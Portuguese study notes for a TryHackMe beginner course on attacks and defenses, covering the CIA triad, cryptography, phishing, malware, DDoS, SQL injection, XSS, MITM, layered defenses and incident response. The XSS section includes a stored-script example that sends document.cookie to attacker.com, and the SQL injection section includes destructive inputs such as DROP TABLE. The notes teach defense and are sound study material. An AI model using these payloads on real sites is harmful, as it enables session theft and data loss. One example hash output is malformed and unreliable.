# Attacks and Defenses

---

## 🔗 Navegação Inteligente

### Sequencial
- **← Anterior:** 6) Software Basics (Python, JavaScript, SQL)
- **Próximo →:** Módulos avançados (Pentesting, CTFs, Especialização)
- **Início:** 1) Introduction to Cyber Security (Fundamentos)
- **Síntese:** Revisitar todos os 7 módulos

### Tópicos Relacionados Nesta Nota
- **CIA Triad:** Ver em 1) Introduction to Cyber Security — CIA Triad
- **Criptografia base:** Ver em 1) Introduction to Cyber Security — Criptografia
- **Malware & Análise:** Ver em 1) Introduction to Cyber Security — Malware Analysis
- **SQL Injection:** Ver em 6) Software Basics — SQL Injection
- **XSS & CSRF:** Ver em 3) How The Web Works — Segurança Web
- **Network Security:** Ver em 2) Network Fundamentals — Segurança
- **OS Security:** Ver em 5) Operating Systems Basics — Segurança

### Referencias Rapidas
- **⚡ Quick Reference** — Ataques, defesas, ferramentas, protocolos
- **🔑 Conceitos-Chave** — Mapa tematico (segurança, CIA, criptografia)
- **📖 Revisão: Introdução à Cibersegurança**

---

## Índice
1. [CIA Triad](#cia-triad)
2. [Criptografia](#criptografia)
3. [Métodos de Ataque](#metodos-ataque)
4. [Estratégias de Defesa](#defesas)
5. [Resposta a Incidentes](#resposta-incidentes)
6. [Conceitos-Chave para Lembrar](#conceitos-chave)

---

## <a name="cia-triad"></a>CIA Triad

A **CIA Triad** é o modelo fundamental de segurança da informação, composto por três pilares:

### 1. Confidentiality (Confidencialidade)

**Garantir que apenas pessoas autorizadas acessem informações.**

```
AMEAÇA: Acesso não autorizado
├── Espionagem
├── Vazamento de dados
├── Interceptação de comunicação
└── Furto de informações

PROTEÇÃO:
├── Criptografia
├── Controle de acesso
├── Autenticação multifator
└── Segmentação de rede
```

**Exemplos:**
```
❌ Senha transmitida em HTTP sem criptografia
✓  Senha transmitida em HTTPS (criptografada)

❌ Arquivo sensível com permissões 777 (todos podem ler)
✓  Arquivo sensível com permissões 600 (apenas dono)

❌ Email em servidor sem criptografia end-to-end
✓  Email em servidor com criptografia PGP
```

### 2. Integrity (Integridade)

**Garantir que dados não sejam modificados sem autorização.**

```
AMEAÇA: Modificação maliciosa de dados
├── Corrupção de dados
├── Modificação de arquivo
├── Man-in-the-Middle (MITM)
└── Injeção de código

PROTEÇÃO:
├── Hash/Checksum
├── Assinatura digital
├── Certificados SSL/TLS
└── Backup e versionamento
```

**Exemplos:**
```
❌ Servidor envia arquivo sem verificação de integridade
✓  Servidor envia arquivo + hash SHA-256 para verificação

❌ Certificado SSL auto-assinado (pode ser falsificado)
✓  Certificado assinado por autoridade confiável (CA)

❌ Software sem verificação de assinatura
✓  Software verificado com assinatura digital do autor
```

### 3. Availability (Disponibilidade)

**Garantir que serviços estejam acessíveis quando necessário.**

```
AMEAÇA: Indisponibilidade de serviço
├── DDoS (Distributed Denial of Service)
├── Falha de hardware
├── Desastres naturais
└── Bugs que travam o servidor

PROTEÇÃO:
├── Redundância
├── Load balancing
├── Backup e disaster recovery
├── Monitoramento contínuo
└── Proteção contra DDoS
```

**Exemplos:**
```
❌ Apenas 1 servidor web
✓  Múltiplos servidores com load balancer

❌ Dados em apenas 1 disco
✓  Dados em RAID e backups offline

❌ Sem plano de continuidade de negócios
✓  Plano de DR (Disaster Recovery) documentado
```

### Conflitos e Equilíbrio

Os três pilares frequentemente **entram em conflito**:

```
CONFIDENCIALIDADE vs DISPONIBILIDADE
- Mais encriptação → Mais seguro, mas mais lento
- Proteger com autenticação forte → Usuarios frustrados

EXEMPLO: 2FA (autenticação de dois fatores)
- Aumenta segurança (confidencialidade)
- Diminui velocidade de acesso (disponibilidade)
```

```
INTEGRIDADE vs DISPONIBILIDADE
- Verificações rigorosas → Sistema mais lento
- Atualização de segurança → Serviço offline

EXEMPLO: Atualização crítica do SO
- Integridade: deve ser aplicada
- Disponibilidade: requer downtime
```

```
CONFIDENCIALIDADE vs INTEGRIDADE
- Enkriptação forte dificulta detecção de integridade
- Verificações podem vazar informações sensíveis

EXEMPLO: Tráfego criptografado end-to-end
- Confidencialidade: ninguém consegue ler
- Integridade: difícil verificar sem descriptografar
```

### Balanceamento na Prática

```
Risco: Perda de dados de clientes
┌─────────────────────────────────────┐
│ Confidencialidade: Criptografia TLS │
│ Integridade: SSL Certificate        │
│ Disponibilidade: 99.99% uptime      │
└─────────────────────────────────────┘

Risco: Ataque DDoS
┌─────────────────────────────────────┐
│ Disponibilidade: Múltiplos servidores
│ Integridade: WAF (Web App Firewall) │
│ Confidencialidade: Rate limiting    │
└─────────────────────────────────────┘
```

---

## <a name="criptografia"></a>Criptografia

### Conceitos Fundamentais

**Criptografia** é o processo de transformar dados em formato ilegível (criptografado) sem a chave correta.

```
Texto Claro → [CRIPTOGRAFAR] → Ciphertext → [DESCRIPTOGRAFAR] → Texto Claro
             (com chave K)     (ilegível)   (com chave K)
```

### Criptografia Simétrica

Usa **mesma chave** para criptografar e descriptografar.

```
┌─────────────────────────────────────────────────┐
│ Criptografia Simétrica                          │
├─────────────────────────────────────────────────┤
│ Alice conhece a chave K                         │
│ Bob conhece a chave K                           │
│                                                 │
│ Alice: Mensagem + K → Ciphertext                │
│         Envia para Bob                          │
│ Bob: Ciphertext + K → Mensagem                  │
└─────────────────────────────────────────────────┘

Problema: Como compartilhar K com segurança?
```

**Algoritmos Comuns:**

| Algoritmo | Tamanho de Chave | Uso |
|---|---|---|
| AES | 128, 192, 256 bits | Padrão moderno |
| DES | 56 bits | OBSOLETO (inseguro) |
| 3DES | 168 bits | Legado (lento) |
| ChaCha20 | 256 bits | Modernos (rápido) |

**Exemplo Python:**

```python
from cryptography.fernet import Fernet

# Gerar chave (guardar com segurança!)
chave = Fernet.generate_key()

# Criptografar
cipher = Fernet(chave)
mensagem = b"Segredo importante"
criptografado = cipher.encrypt(mensagem)
print(criptografado)  # gAAAAABl...

# Descriptografar
descriptografado = cipher.decrypt(criptografado)
print(descriptografado)  # b'Segredo importante'
```

### Criptografia Assimétrica

Usa **duas chaves diferentes**: pública (pública) e privada (secreta).

```
┌────────────────────────────────────────────────┐
│ Criptografia Assimétrica (RSA, ECDSA)          │
├────────────────────────────────────────────────┤
│ Alice tem par de chaves: Pública + Privada     │
│ Bob tem par de chaves: Pública + Privada       │
│                                                │
│ Comunicação segura:                            │
│ 1. Alice obtém chave pública de Bob            │
│ 2. Alice criptografa com chave pública de Bob  │
│ 3. Bob descriptografa com sua chave privada    │
│ 4. Apenas Bob consegue ler (tem privada)       │
└────────────────────────────────────────────────┘
```

**Propriedade:**
```
Mensagem criptografada com CHAVE PÚBLICA
     ↓
Só pode ser descriptografada com CHAVE PRIVADA

Assinatura com CHAVE PRIVADA
     ↓
Pode ser verificada com CHAVE PÚBLICA
```

**Comparação Simétrica vs Assimétrica:**

| Aspecto | Simétrica | Assimétrica |
|---|---|---|
| **Número de Chaves** | 1 chave (compartilhada) | 2 chaves (pub + priv) |
| **Velocidade** | Rápida | Lenta (100-1000x) |
| **Distribuição de Chave** | Difícil (precisa encontro) | Fácil (publica chave) |
| **Escalabilidade** | Ruim (N² chaves) | Boa (2N chaves) |
| **Uso** | Criptografia de volume | Troca de chaves, assinatura |

### Criptografia Híbrida

Combina **simetria** (rápida) + **assimetria** (distribuição fácil).

```
Cenário: Alice quer enviar arquivo grande para Bob

1. Alice criptografa arquivo com chave simétrica K (rápido)
2. Alice criptografa K com chave pública de Bob (seguro)
3. Envia: arquivo_criptografado + K_criptografada
4. Bob descriptografa K com sua chave privada
5. Bob descriptografa arquivo com K

Vantagem: Segurança + velocidade
```

**Usado em:**
- TLS/HTTPS
- PGP/GPG
- Criptografia de emails
- Bitcoin e blockchain

### Hashing (Função de Hash)

Um **hash** é uma função que transforma dados em tamanho fixo, irreversível.

```
Dados (qualquer tamanho)
    ↓
[FUNÇÃO DE HASH]
    ↓
Hash (tamanho fixo, geralmente 256 bits)

Propriedades:
• Determinístico: mesmos dados → mesmo hash
• Rápido: calcula rapidamente
• Unidirecional: impossível reverter para dados originais
• Sensível: uma mudança mínima → hash completamente diferente
```

**Comparação Simétrica vs Hash:**

```
SIMÉTRICA:
"Olá" + chave K → "Ã#$@!"
"Ã#$@!" + chave K → "Olá" ✓ Reversível

HASH:
"Olá" → d4d6d4d4...
"Olá" → d4d6d4d4... (sempre igual)
d4d6d4d4... → ??? (irreversível)
```

**Algoritmos Comuns:**

| Algoritmo | Tamanho | Status | Uso |
|---|---|---|---|
| MD5 | 128 bits | QUEBRADO | Legado apenas |
| SHA-1 | 160 bits | QUEBRADO | Legado |
| SHA-256 | 256 bits | Seguro | Padrão moderno |
| SHA-3 | 256-512 bits | Seguro | Futuro |
| bcrypt | 192 bits | Seguro + lento | Senhas |

**Exemplo Python:**

```python
import hashlib

# SHA-256
texto = "senha123"
hash_sha256 = hashlib.sha256(texto.encode()).hexdigest()
print(hash_sha256)
# 25d4ebbba6e3f72c7827bfbecc7e44fdf5f5eee94c2c59d34cf37e99e8419676

# Qualquer mudança → hash completamente diferente
texto2 = "senha124"
hash_sha256_2 = hashlib.sha256(texto2.encode()).hexdigest()
print(hash_sha256_2)
# 24da8dc25e34f69efb8c6ca91bdfb5ff0e5d0f4c3e1c1d0e0c7d6b5a4e3c2d1

# Senhas: usar bcrypt (mais lento, mais seguro)
import bcrypt

senha = "minha_senha_secreta"
salt = bcrypt.gensalt()
hash_senha = bcrypt.hashpw(senha.encode(), salt)

# Verificar
valida = bcrypt.checkpw(senha.encode(), hash_senha)
print(valida)  # True
```

### Assinatura Digital

Prova que documento foi assinado por quem diz ter assinado (autenticidade e não-repúdio).

```
Processo de Assinatura:
1. Alice calcula hash do documento
2. Alice criptografa hash com sua chave PRIVADA
3. Envia documento + assinatura

Processo de Verificação:
1. Bob recebe documento + assinatura
2. Bob descriptografa assinatura com chave PÚBLICA de Alice
3. Bob calcula hash do documento
4. Se hashes coincidem → assinatura válida!

Garante:
• Autenticidade: prova que Alice assinou
• Integridade: documento não foi modificado
• Não-repúdio: Alice não pode negar ter assinado
```

---

## <a name="metodos-ataque"></a>Métodos de Ataque

### 1. Engenharia Social

**Manipulação psicológica** para obter informações ou acesso.

```
Técnicas:
├── Phishing
├── Pretexting
├── Baiting
├── Tailgating
└── Reverse social engineering
```

#### Phishing

Enganar vítima para clicar link malicioso ou fornecer credenciais.

```
Email falso:
┌────────────────────────────────────┐
│ De: banco@yourbank.com (falso!)    │
│ Assunto: Confirme sua identidade   │
│                                    │
│ Prezado cliente,                   │
│ Clique aqui para confirmar dados   │
│ https://bankfake.com/login         │
│                                    │
│ [Botão "Confirmar"]                │
└────────────────────────────────────┘

Vítima clica → Credenciais roubadas
```

**Proteção:**
```
✓ Verificar domínio do email (não "yourbank.com")
✓ Passar mouse sobre links antes de clicar
✓ Autenticação multifator (2FA)
✓ Software anti-phishing
✓ Treinamento de usuários
```

#### Pretexting

Criar cenário falso para ganhar confiança.

```
Exemplo:
Atacante liga para TI da empresa:
"Oi, sou novo funcionário. Esqueci minha senha do WiFi."
TI inocentemente fornece a senha.
```

### 2. Malware

**Software malicioso** que causa dano ao sistema.

```
Tipos:
├── Vírus: Se replica infectando outros arquivos
├── Worm: Se replica automaticamente pela rede
├── Trojan: Esconde-se como programa legítimo
├── Ransomware: Criptografa dados e pede resgate
├── Spyware: Monitora atividades do usuário
├── Rootkit: Acesso privilegiado invisível
└── Botnet: Infecta máquinas para ataques coordenados
```

**Exemplo Ransomware:**

```
1. Usuário recebe email com anexo
2. Clica no anexo (PDF malicioso)
3. Ransomware criptografa todos os arquivos
4. Tela exibe mensagem:
   ┌─────────────────────────────────┐
   │ Seus arquivos foram criptografados
   │ Pague 1 Bitcoin em 24h para chave
   │ Ou seus dados serão deletados
   │ Endereço Bitcoin: 1A2B3C4D...
   └─────────────────────────────────┘

Proteção:
✓ Não abrir anexos de fontes desconhecidas
✓ Desabilitar macros no Office
✓ Manter sistema atualizado
✓ Backup offline regular
```

### 3. Ataques de Rede

#### DDoS (Distributed Denial of Service)

**Sobrecarrega servidor com requisições de múltiplas fontes** para indisponibilizá-lo.

```
Botnet (1000+ máquinas infectadas)
        │
        ├─ Atacante comanda
        │
        └─ Todas enviam requisições simultâneas
              ↓
           Servidor
           (sobrecarregado)
              ↓
           Serviço DOWN ❌
```

**Exemplos:**
```
1. Flood de SYN: Muitas conexões TCP incompletas
2. UDP Flood: Enormes pacotes UDP
3. DNS Amplification: Abusa servidores DNS
4. Application Layer: Requisições HTTP válidas em volume
```

**Proteção:**
```
✓ Rate limiting (máx requisições por IP)
✓ Web Application Firewall (WAF)
✓ Serviço de mitigação de DDoS
✓ Múltiplos servidores (distribuição)
✓ Análise de tráfego anormal
```

### 4. SQL Injection

**Inserir código SQL malicioso** em campos de entrada.

```
Código VULNERÁVEL:
└─ query = "SELECT * FROM usuarios WHERE id = " + input

Se input = "1 OR 1=1"
Resultado: SELECT * FROM usuarios WHERE id = 1 OR 1=1
Retorna TODOS os usuários! ❌

Se input = "1; DROP TABLE usuarios; --"
Resultado: SELECT * FROM usuarios WHERE id = 1; DROP TABLE usuarios; --
Deleta tabela inteira! ❌
```

**Proteção - Prepared Statements:**

```python
# ❌ INSEGURO
query = f"SELECT * FROM usuarios WHERE id = {user_input}"

# ✓ SEGURO
query = "SELECT * FROM usuarios WHERE id = ?"
cursor.execute(query, (user_input,))
```

### 5. XSS (Cross-Site Scripting)

**Injetar JavaScript malicioso** em página web.

```
Tipo 1: Reflected XSS
Atacante cria URL:
https://site.com/search?q=<script>alert('hacked')</script>
Vítima clica link → Script executa no navegador

Tipo 2: Stored XSS (mais perigoso)
Comentário em fórum:
"Ótimo post! <script>fetch('https://attacker.com?cookie=' + document.cookie)</script>"
Todo visitante executa script → Cookies roubados

Tipo 3: DOM-based XSS
JavaScript client-side inseguro:
document.getElementById('output').innerHTML = user_input;
```

**Proteção:**

```html
<!-- ❌ INSEGURO: confiar em input do usuário -->
<div id="output"></div>
<script>
  document.getElementById('output').innerHTML = user_input;
</script>

<!-- ✓ SEGURO: usar textContent (não HTML) -->
<div id="output"></div>
<script>
  document.getElementById('output').textContent = user_input;
</script>

<!-- ✓ SEGURO: Escapar HTML -->
<!-- Ruby on Rails: <%= h user_input %> -->
<!-- Django: {{ user_input|escape }} -->
```

### 6. Man-in-the-Middle (MITM)

**Interceptar comunicação** entre duas partes.

```
Sem proteção:
Alice ←→ [Atacante] ←→ Bob
        Pode ler e modificar

Com HTTPS (TLS):
Alice ←→ [Criptografia] ←→ Bob
        Atacante vê apenas texto criptografado
```

**Exemplo de ataque:**

```
Rede WiFi pública:
Atacante se coloca no meio
        ↓
Vítima acessa site HTTP (não HTTPS)
        ↓
Atacante intercepta: login, senhas, cookies
        ↓
Atacante pode se passar pela vítima
```

**Proteção:**
```
✓ Usar HTTPS em todas as comunicações
✓ Verificar certificados SSL (não auto-assinado)
✓ VPN em redes públicas
✓ Certificate pinning em aplicações móveis
```

---

## <a name="defesas"></a>Estratégias de Defesa

### Defense in Depth (Defesa em Profundidade)

**Múltiplas camadas de segurança** para quando uma falha, outras ainda protegem.

```
┌──────────────────────────────────────────┐
│ 1. Firewall perimetral                   │
├──────────────────────────────────────────┤
│ 2. IDS/IPS (detecção de intrusão)        │
├──────────────────────────────────────────┤
│ 3. WAF (Web Application Firewall)        │
├──────────────────────────────────────────┤
│ 4. Autenticação forte (MFA)              │
├──────────────────────────────────────────┤
│ 5. Criptografia (dados em trânsito)      │
├──────────────────────────────────────────┤
│ 6. Aplicação com validação de input      │
├──────────────────────────────────────────┤
│ 7. Criptografia (dados em repouso)       │
├──────────────────────────────────────────┤
│ 8. Banco de dados seguro                 │
└──────────────────────────────────────────┘
```

### Princípio do Menor Privilégio

**Usuários/processos têm apenas permissões mínimas necessárias.**

```
❌ Errado:
Todos os funcionários com acesso admin
Serviço web rodando como root
Banco de dados sem segregação de dados

✓ Correto:
RH acessa apenas folha de pagamento
Desenvolvimento acessa apenas branch dev
Serviço web roda como usuário www-data
Banco de dados com roles e permissões granulares
```

### Autenticação Multifator (MFA)

**Exigir múltiplas formas de identificação.**

```
Fatores:
1. Algo que você SABE: Senha, PIN
2. Algo que você TEM: Telefone, token, cartão
3. Algo que você É: Biometria (digitais, face)

Exemplo 2FA:
┌─────────────────┐
│ Email: alice... │
│ Senha: ••••••   │ ← Fator 1 (conhecimento)
│ [Enviar código] │
└─────────────────┘
        ↓
Código enviado para telefone
        ↓
┌──────────────────┐
│ Código: [______] │ ← Fator 2 (posse)
│ [Confirmar]      │
└──────────────────┘
        ↓
Acesso concedido!
```

### Logging e Monitoramento

**Registrar eventos para detecção de ataques e investigação.**

```
O que registrar:
├── Tentativas de logon (bem-sucedidas e falhadas)
├── Acesso a arquivos sensíveis
├── Mudanças de permissões
├── Alterações no firewall
├── Tráfego de rede suspeito
├── Erros de aplicação
└── Tentativas de privilege escalation

Exemplo de log:
2024-01-15 10:30:45 [ALERT] 5 tentativas de logon falhadas de alice de 192.168.1.100
2024-01-15 10:31:02 [INFO] alice acessou /var/www/secrets.txt
2024-01-15 10:32:15 [ALERT] /etc/passwd foi modificado
```

**Ferramentas:**
```
Linux:
• syslog: Logs do sistema
• auditd: Auditoria detalhada
• journalctl: Logs do systemd

Windows:
• Event Viewer: Eventos do sistema
• PowerShell Transcript: Histórico de comandos

Centralizados:
• ELK Stack (Elasticsearch, Logstash, Kibana)
• Splunk
• Graylog
```

### Patch Management

**Manter sistemas atualizados com correções de segurança.**

```
Ciclo de vida de patch:
1. Fornecedor descobre vulnerabilidade
2. Publica patch
3. Admin testa em ambiente não-produção
4. Deploy em produção
5. Verificação pós-patch

Exemplo:
Windows Update toda segunda terça do mês
Ubuntu: apt-get upgrade regularmente
Aplicações: Verificar atualizações periodicamente
```

### Backup e Disaster Recovery

**Recuperação após perda de dados.**

```
Estratégia 3-2-1:
3 cópias de dados
2 tipos de mídia diferentes
1 cópia offline/fora do local

Exemplo:
├── Cópia 1: Sistema em produção
├── Cópia 2: Backup em disco local
├── Cópia 3: Backup em cloud
└── Cópia 4: Fita em cofre (offline)

RTO (Recovery Time Objective): Quanto tempo para restaurar?
RPO (Recovery Point Objective): Quanto tempo de perda de dados é aceitável?

Exemplo:
RTO: 4 horas (máximo downtime aceitável)
RPO: 1 hora (máximo 1 hora de dados perdidos)
```

### Segurança de Código

**Práticas durante desenvolvimento.**

```
✓ Validar TODOS os inputs
✓ Usar prepared statements para SQL
✓ Escapar dados na saída
✓ Implementar CORS corretamente
✓ Usar HTTPS
✓ Não armazenar secrets em código
✓ Dependências atualizadas
✓ Code review antes de merge
✓ Testes de segurança (SAST, DAST)
✓ Logging de operações sensíveis

Exemplo em Python:
# Não fazer isso:
password = "admin123"  # ❌ Em código fonte

# Fazer isso:
password = os.getenv('APP_PASSWORD')  # ✓ Variável de ambiente
```

---

## <a name="resposta-incidentes"></a>Resposta a Incidentes

### Fases do Incident Response

```
1. PREPARAÇÃO
   ├── Equipe designada
   ├── Ferramentas e procedimentos
   ├── Comunicação com stakeholders
   └── Treinamento regular

2. DETECÇÃO E ANÁLISE
   ├── Identificar incidente
   ├── Determinar severidade
   ├── Coletar evidência
   └── Documentar descobertas

3. CONTENÇÃO
   ├── Isolar sistemas comprometidos
   ├── Impedir propagação
   ├── Preservar logs
   └── Minimizar dano

4. ERRADICAÇÃO
   ├── Remover malware
   ├── Fechar vulnerabilidades
   ├── Resetar credenciais
   └── Confirmar limpeza

5. RECUPERAÇÃO
   ├── Restaurar de backups confiáveis
   ├── Aplicar patches
   ├── Monitorar intensamente
   └── Validar funcionamento

6. PÓS-INCIDENTE
   ├── Relatório completo
   ├── Lições aprendidas
   ├── Melhorias implementadas
   └── Compartilhar conhecimento
```

### Checklist de Resposta

```
IMEDIATO (primeiros 5 minutos):
□ Identificar incidente
□ Avisar gerente de segurança
□ Iniciar documentação
□ Não desligar sistemas (preserva evidência)

PRIMEIROS 30 MINUTOS:
□ Avaliar escopo
□ Determinar severidade (1-4)
□ Criar war room
□ Coletar imagens de memória/disco
□ Preservar logs
□ Avisar stakeholders críticos

PRIMEIRA HORA:
□ Isolar sistemas afetados da rede
□ Ativar plano de continuidade
□ Contatar forensics se necessário
□ Comunicação com executivos
□ Verificar backups antes de usar

DIAS 1-3:
□ Análise completa de causa-raiz
□ Verificação de propagação
□ Remediação total
□ Testes de recuperação

SEMANA 1:
□ Relatório executivo
□ Recomendações de prevenção
□ Implementar correções
```

### Análise de Causa-Raiz (RCA)

```
Pergunta: Por que o incidente ocorreu?

Exemplo de incidente: Dados de clientes vazados

Superficial:
"Porque a senha de BD era fraca"

Raiz:
"Porque não tinha processo de rotação de senha
 E não tinha MFA
 E não tinha segmentação de rede
 E não tinha auditoria ativa"

Ações:
1. Implementar política de senhas forte
2. Forçar MFA para acesso ao BD
3. Segregar BD em VLAN separada
4. Ativar logging de acesso ao BD
5. Treinar equipe em segurança
```

---

## <a name="conceitos-chave"></a>Conceitos-Chave para Lembrar

### CIA Triad
- **Confidencialidade** protege contra acesso não autorizado (criptografia, controle de acesso)
- **Integridade** protege contra modificação (hash, assinatura digital)
- **Disponibilidade** protege contra indisponibilidade (redundância, backup, proteção DDoS)
- Os três pilares frequentemente **entram em conflito** - requer equilíbrio

### Criptografia
- **Simétrica** é rápida mas difícil de distribuir chaves
- **Assimétrica** é lenta mas fácil de distribuir (chave pública)
- **Híbrida** combina os dois para melhor proveito
- **Hash** é unidirecional e irreversível
- **Assinatura digital** prova autenticidade e não-repúdio

### Ataques Comuns
- **Engenharia Social**: Manipulação psicológica (phishing, pretexting)
- **Malware**: Vírus, worms, trojans, ransomware, spyware, rootkits
- **DDoS**: Sobrecarrega servidor com requisições
- **SQL Injection**: Código SQL malicioso em inputs (use prepared statements)
- **XSS**: JavaScript malicioso em página web (escape outputs)
- **MITM**: Interceptação de comunicação (use HTTPS/TLS)

### Defesas
- **Defense in Depth**: Múltiplas camadas de segurança
- **Least Privilege**: Apenas permissões necessárias
- **MFA**: Autenticação multifator (senha + biometria/token)
- **Logging & Monitoring**: Detecção e investigação de ataques
- **Patch Management**: Manter sistemas atualizados
- **Backup & DR**: Recuperação após incidentes
- **Secure Coding**: Validar inputs, escapar outputs, usar prepared statements

### Resposta a Incidentes
- **6 Fases**: Preparação → Detecção → Contenção → Erradicação → Recuperação → Pós-incidente
- **RCA (Root Cause Analysis)**: Investigar causa fundamental, não sintoma
- **Documentação**: Registro completo para análise futura
- **Comunicação**: Avisar stakeholders apropriados no tempo certo
- **Preservação de Evidência**: Não desligar sistemas, coletar imagens

---

## Checklist de Segurança Prático

### Para Usuários Finais
- [ ] Senha forte (12+ caracteres, variada)
- [ ] Autenticação de dois fatores habilitada
- [ ] Software atualizado
- [ ] Antivírus/antimalware ativo
- [ ] Backups regulares
- [ ] Não abrir anexos de desconhecidos
- [ ] Verificar URLs antes de clicar
- [ ] VPN em redes públicas

### Para Administradores
- [ ] Firewall configurado
- [ ] SSH em porta não-padrão
- [ ] Desabilitar root login
- [ ] Permissões corretas em arquivos
- [ ] Logging centralizado
- [ ] Monitoramento em tempo real
- [ ] Backup offline regular
- [ ] Plano de DR documentado

### Para Desenvolvedores
- [ ] Validar todos os inputs
- [ ] Escapar outputs
- [ ] Usar prepared statements
- [ ] HTTPS obrigatório
- [ ] Secrets em variáveis de ambiente
- [ ] Dependências atualizadas
- [ ] Code review antes de merge
- [ ] Testes de segurança

---

## 🚀 Próximos Passos Após Pre Security

### Consolidação Final
1. **Revisitar todos os 7 módulos:** Consolidar conhecimento de todos os tópicos abordados
2. **Conectar os pontos:** Entender como atacantes exploram falhas de todos os níveis (aplicação, SO, rede, hardware)
3. **Praticar CTFs:** Tentar desafios práticos que combinam todos os conhecimentos aprendidos

### Caminhos Especializados Após Pre Security
- **Red Team Path (TryHackMe):** Pentesting, exploração, desenvolvimento de exploits
- **Blue Team Path (TryHackMe):** Defesa, detecção, resposta a incidentes
- **Certificações:** CompTIA Security+, CEH, eJPT
- **Pesquisa de Segurança:** Zero-days, análise de vulnerabilidades, reverse engineering

### Tópicos Avançados para Aprofundamento
- **Privilege Escalation:** Exploração em Windows e Linux
- **Active Directory:** Conceitos e ataques específicos
- **Web Application Security:** OWASP Top 10 em profundidade
- **Network Exploitation:** Man-in-the-Middle, ataques em camada de rede
- **Malware Analysis:** Análise estática e dinâmica de malware
- **Forensics:** Análise de memória, disco e artefatos digitais
- **Social Engineering:** Ataques comportamentais e mitigação

### Recursos de Continuação
- **TryHackMe:** Junior Penetration Tester Path, Complete Beginner Path
- **HackTheBox:** Máquinas práticas de escalação progressiva
- **OWASP:** Documentação de vulnerabilidades web
- **MITRE ATT&CK:** Framework de técnicas de adversários

### Prática Contínua Recomendada
- Resolver 1-2 CTFs por semana
- Documentar todas as descobertas e técnicas
- Participar em comunidades (Reddit r/cybersecurity, Discord servers)
- Manter máquina de laboratório atualizada
- Seguir blogs de segurança (Krebs, Dark Reading, Bleeping Computer)

---

## 📊 Resumo do Pre Security Path

| Módulo | Tópicos Principais | Importância |
|--------|------------------|-------------|
| 1) Intro | CIA Triad, Careers, Ofensiva/Defensiva | ⭐⭐⭐ Fundamental |
| 2) Networks | OSI, TCP/IP, DNS, Portas | ⭐⭐⭐ Fundamental |
| 3) Web | HTTP/HTTPS, DNS, Frontend/Backend | ⭐⭐⭐ Fundamental |
| 4) Hardware | CPU, RAM, Arquitetura, Segurança | ⭐⭐ Contexto importante |
| 5) OS | Linux, Windows, CLI, Permissões | ⭐⭐⭐ Fundamental |
| 6) Software | Python, JavaScript, SQL | ⭐⭐⭐ Fundamental |
| 7) Attacks | CIA, Criptografia, Defesas, IR | ⭐⭐⭐ Síntese crítica |

---

## 🔖 Tags

#cybersecurity #security #presecurity #tryhackme #cia #encryption #attacks #defenses #malware #incidentresponse #penetration #defense #hacking #ethical

---

_Parabéns por completares o Pre Security Path! Este é o início da tua jornada em Cibersegurança._  
_Notas criadas para o TryHackMe Pre Security Path — Attacks and Defenses_  
_Formatado para Obsidian_
